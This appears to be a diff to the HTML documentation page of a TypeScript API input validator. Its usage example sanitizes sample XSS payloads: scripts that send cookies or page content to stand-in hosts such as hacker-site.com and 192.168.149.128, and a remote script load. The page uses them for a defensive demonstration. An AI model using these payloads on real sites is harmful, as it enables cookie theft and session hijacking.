@@ -95,10 +95,91 @@
 					<h2>Description</h2>
 				</a>
 				<p>This package allows you to validate user input used by API Services.
-				Validation is performed against JSON schema and XSS injections.</p>
+					Validation is performed against JSON schema and XSS injections. <br/>
+				Detailed information can be found in the API Doc of the <a href="https://marinrusu1997.github.io/thermopylae/lib.api-validator/classes/apivalidator.html">ApiValidator</a> class.</p>
 				<a href="#usage" id="usage" style="color: inherit; text-decoration: none;">
 					<h2>Usage</h2>
 				</a>
+				<p>Assuming you have a directory structure as described <a href="https://marinrusu1997.github.io/thermopylae/lib.api-validator/classes/apivalidator.html#init">here</a>,
+					let&#39;s look at an example of how this package can be used.
+				Supposing we have the following schemas:</p>
+				<pre><code class="language-text">└─ schemas
+    └─ authentication-service
+    │ ├─ login.json
+    │ └─ logout.json
+    ├─ book-service
+    │ ├─ create.json
+    │ ├─ read.json
+    │ └─ delete.json
+    └─ core
+      └─ commons.json
+</code></pre>
+				<p>We can perform validation in the following manner:</p>
+				<pre><code class="language-typescript"><span style="color: #AF00DB">import</span><span style="color: #000000"> { </span><span style="color: #001080">ApiValidator</span><span style="color: #000000">, </span><span style="color: #001080">ValidationError</span><span style="color: #000000"> } </span><span style="color: #AF00DB">from</span><span style="color: #000000"> </span><span style="color: #A31515">&#039;@thermopylae/lib.api-validator&#039;</span><span style="color: #000000">;</span>
+
+<span style="color: #000000">(</span><span style="color: #0000FF">async</span><span style="color: #000000"> </span><span style="color: #0000FF">function</span><span style="color: #000000"> </span><span style="color: #795E26">main</span><span style="color: #000000">() {</span>
+<span style="color: #000000">    </span><span style="color: #008000">/* Perform initialization */</span>
+<span style="color: #000000">    </span><span style="color: #0000FF">const</span><span style="color: #000000"> </span><span style="color: #0070C1">validator</span><span style="color: #000000"> = </span><span style="color: #0000FF">new</span><span style="color: #000000"> </span><span style="color: #795E26">ApiValidator</span><span style="color: #000000">();</span>
+<span style="color: #000000">    </span><span style="color: #008000">// assuming schemas from &#039;core&#039; folder are referenced by schemas from other service folders</span>
+<span style="color: #000000">    </span><span style="color: #AF00DB">await</span><span style="color: #000000"> </span><span style="color: #001080">validator</span><span style="color: #000000">.</span><span style="color: #795E26">init</span><span style="color: #000000">(</span><span style="color: #A31515">&#039;./schemas&#039;</span><span style="color: #000000">, [</span><span style="color: #A31515">&#039;core&#039;</span><span style="color: #000000">]);</span>
+<span style="color: #000000">    </span>
+<span style="color: #000000">    </span><span style="color: #008000">/* Successfull Scenario */</span>
+<span style="color: #000000">    </span><span style="color: #0000FF">let</span><span style="color: #000000"> </span><span style="color: #001080">validData</span><span style="color: #000000"> = {</span>
+<span style="color: #000000">        </span><span style="color: #001080">username:</span><span style="color: #000000"> </span><span style="color: #A31515">&#039;username&#039;</span><span style="color: #000000">,</span>
+<span style="color: #000000">        </span><span style="color: #001080">password:</span><span style="color: #000000"> </span><span style="color: #A31515">&#039;password&#039;</span>
+<span style="color: #000000">    };</span>
+<span style="color: #000000">    </span><span style="color: #008000">// schema has id: #AUTHENTICATION_SERVICE-LOGIN</span>
+<span style="color: #000000">    </span><span style="color: #001080">validData</span><span style="color: #000000"> = </span><span style="color: #AF00DB">await</span><span style="color: #000000"> </span><span style="color: #001080">validator</span><span style="color: #000000">.</span><span style="color: #795E26">validate</span><span style="color: #000000">(</span><span style="color: #A31515">&#039;AUTHENTICATION_SERVICE&#039;</span><span style="color: #000000">, </span><span style="color: #A31515">&#039;LOGIN&#039;</span><span style="color: #000000">, </span><span style="color: #001080">validData</span><span style="color: #000000">);</span>
+<span style="color: #000000">    </span>
+<span style="color: #000000">    </span><span style="color: #008000">/* Error Scenario */</span>
+<span style="color: #000000">    </span><span style="color: #AF00DB">try</span><span style="color: #000000"> {</span>
+<span style="color: #000000">        </span><span style="color: #0000FF">let</span><span style="color: #000000"> </span><span style="color: #001080">invalidData</span><span style="color: #000000"> = {</span>
+<span style="color: #000000">            </span><span style="color: #001080">nameeee:</span><span style="color: #000000"> </span><span style="color: #A31515">&#039;Les Trois Mousquetaires&#039;</span><span style="color: #000000">,</span>
+<span style="color: #000000">            </span><span style="color: #001080">author:</span><span style="color: #000000"> </span><span style="color: #A31515">&#039;Alexandre Dumas&#039;</span>
+<span style="color: #000000">        };</span>
+<span style="color: #000000">        </span><span style="color: #001080">invalidData</span><span style="color: #000000"> = </span><span style="color: #AF00DB">await</span><span style="color: #000000"> </span><span style="color: #001080">validator</span><span style="color: #000000">.</span><span style="color: #795E26">validate</span><span style="color: #000000">(</span><span style="color: #A31515">&#039;BOOK_SERVICE&#039;</span><span style="color: #000000">, </span><span style="color: #A31515">&#039;CREATE&#039;</span><span style="color: #000000">, </span><span style="color: #001080">invalidData</span><span style="color: #000000">);</span>
+<span style="color: #000000">    } </span><span style="color: #AF00DB">catch</span><span style="color: #000000"> (</span><span style="color: #001080">e</span><span style="color: #000000">) {</span>
+<span style="color: #000000">        </span><span style="color: #AF00DB">if</span><span style="color: #000000"> (</span><span style="color: #001080">e</span><span style="color: #000000"> </span><span style="color: #0000FF">instanceof</span><span style="color: #000000"> </span><span style="color: #267F99">ValidationError</span><span style="color: #000000">) {</span>
+<span style="color: #000000">            </span><span style="color: #001080">console</span><span style="color: #000000">.</span><span style="color: #795E26">error</span><span style="color: #000000">(</span><span style="color: #001080">validator</span><span style="color: #000000">.</span><span style="color: #795E26">joinErrors</span><span style="color: #000000">(</span><span style="color: #001080">e</span><span style="color: #000000">.</span><span style="color: #001080">errors</span><span style="color: #000000">, </span><span style="color: #A31515">&#039;text&#039;</span><span style="color: #000000">));</span>
+<span style="color: #000000">            </span><span style="color: #001080">console</span><span style="color: #000000">.</span><span style="color: #795E26">error</span><span style="color: #000000">(</span><span style="color: #001080">validator</span><span style="color: #000000">.</span><span style="color: #795E26">joinErrors</span><span style="color: #000000">(</span><span style="color: #001080">e</span><span style="color: #000000">.</span><span style="color: #001080">errors</span><span style="color: #000000">, </span><span style="color: #A31515">&#039;json&#039;</span><span style="color: #000000">));</span>
+<span style="color: #000000">        }</span>
+<span style="color: #000000">        </span><span style="color: #AF00DB">throw</span><span style="color: #000000"> </span><span style="color: #001080">e</span><span style="color: #000000">;</span>
+<span style="color: #000000">    }</span>
+<span style="color: #000000">    </span>
+<span style="color: #000000">    </span><span style="color: #008000">/* XSS sanitization */</span>
+<span style="color: #000000">    </span><span style="color: #0000FF">const</span><span style="color: #000000"> </span><span style="color: #0070C1">jsonWithXss</span><span style="color: #000000"> = {</span>
+<span style="color: #000000">        </span><span style="color: #008000">// XSS Attack: steal sensitive information</span>
+<span style="color: #000000">        </span><span style="color: #001080">name:</span><span style="color: #000000"> </span><span style="color: #A31515">&#039;&lt;script&gt;new Image().src=&quot;http://192.168.149.128/bogus.php?output=&quot;+document.body.innerHTML&lt;/script&gt;&#039;</span><span style="color: #000000">,</span>
+<span style="color: #000000">        </span><span style="color: #008000">// XSS Attack: Steal user cookie</span>
+<span style="color: #000000">        </span><span style="color: #001080">surname:</span><span style="color: #000000"> </span><span style="color: #A31515">&quot;&lt;script&gt;document.write(&#039;&lt;img src=</span><span style="color: #EE0000">\&quot;</span><span style="color: #A31515">https://hacker-site.com/collect.gif?cookie=&#039; + document.cookie + &#039;</span><span style="color: #EE0000">\&quot;</span><span style="color: #A31515"> /&gt;&#039;)&lt;/script&gt;&quot;</span><span style="color: #000000">,</span>
+<span style="color: #000000">        </span><span style="color: #008000">// XSS Attack: Execute hacker script</span>
+<span style="color: #000000">        </span><span style="color: #001080">age:</span><span style="color: #000000"> </span><span style="color: #A31515">&#039;http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&lt;script src=&quot;http://192.168.149.128/xss.js&quot;&gt;&#039;</span><span style="color: #000000">,</span>
+<span style="color: #000000">        </span><span style="color: #008000">// assuming this prop was added by some of your interceptors</span>
+<span style="color: #000000">        </span><span style="color: #001080">origin:</span><span style="color: #000000"> {</span>
+<span style="color: #000000">            </span><span style="color: #001080">ip:</span><span style="color: #000000"> </span><span style="color: #A31515">&#039;127.0.0.1&#039;</span>
+<span style="color: #000000">        }</span>
+<span style="color: #000000">    };</span>
+<span style="color: #000000">    </span><span style="color: #001080">validator</span><span style="color: #000000">.</span><span style="color: #795E26">sanitize</span><span style="color: #000000">(</span><span style="color: #001080">jsonWithXss</span><span style="color: #000000">, </span><span style="color: #0000FF">new</span><span style="color: #000000"> </span><span style="color: #267F99">Set</span><span style="color: #000000">([</span><span style="color: #A31515">&#039;origin.ip&#039;</span><span style="color: #000000">]));</span>
+<span style="color: #000000">    </span><span style="color: #008000">/**</span>
+<span style="color: #008000">     * After sanitization it will look like this:</span>
+<span style="color: #008000">     * {</span>
+<span style="color: #008000">     *   name: &#039;&amp;lt;script&amp;gt;new Image().src=&quot;http://192.168.149.128/bogus.php?output=&quot;+document.body.innerHTML&amp;lt;/script&amp;gt;&#039;,</span>
+<span style="color: #008000">     *   surname: `&amp;lt;script&amp;gt;document.write(&#039;&lt;img src=&quot;https://hacker-site.com/collect.gif?cookie=&#039; + document.cookie + &#039;&quot; /&gt;&#039;)&amp;lt;/script&amp;gt;`,</span>
+<span style="color: #008000">     *   age: &#039;http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&amp;lt;script src=&quot;http://192.168.149.128/xss.js&quot;&amp;gt;&#039;,</span>
+<span style="color: #008000">     *   origin: {</span>
+<span style="color: #008000">     *       ip: &#039;127.0.0.1&#039;</span>
+<span style="color: #008000">     *   }</span>
+<span style="color: #008000">     * }</span>
+<span style="color: #008000">     */</span>
+<span style="color: #000000">    </span>
+<span style="color: #000000">    </span><span style="color: #0000FF">let</span><span style="color: #000000"> </span><span style="color: #001080">stringWithXSS</span><span style="color: #000000"> = </span><span style="color: #A31515">&#039;&lt;button onclick=</span><span style="color: #EE0000">\&#039;</span><span style="color: #A31515">document.location= &quot;http://www.example.com/cookie_catcher.php?c=&quot; + document.cookie</span><span style="color: #EE0000">\&#039;</span><span style="color: #A31515">&gt;&lt;/button&gt;&#039;</span><span style="color: #000000">;</span>
+<span style="color: #000000">    </span><span style="color: #001080">stringWithXSS</span><span style="color: #000000"> = </span><span style="color: #001080">validator</span><span style="color: #000000">.</span><span style="color: #795E26">sanitize</span><span style="color: #000000">(</span><span style="color: #001080">stringWithXSS</span><span style="color: #000000">);</span>
+<span style="color: #000000">    </span><span style="color: #008000">/**</span>
+<span style="color: #008000">     * After sanitization it will look like this:</span>
+<span style="color: #008000">     * &#039;&amp;lt;button onclick=\&#039;document.location= &quot;http://www.example.com/cookie_catcher.php?c=&quot; + document.cookie\&#039;&amp;gt;&amp;lt;/button&amp;gt;&#039;</span>
+<span style="color: #008000">     */</span>
+<span style="color: #000000">})();</span>
+</code></pre>
 				<a href="#api-reference" id="api-reference" style="color: inherit; text-decoration: none;">
 					<h2>API Reference</h2>
 				</a>
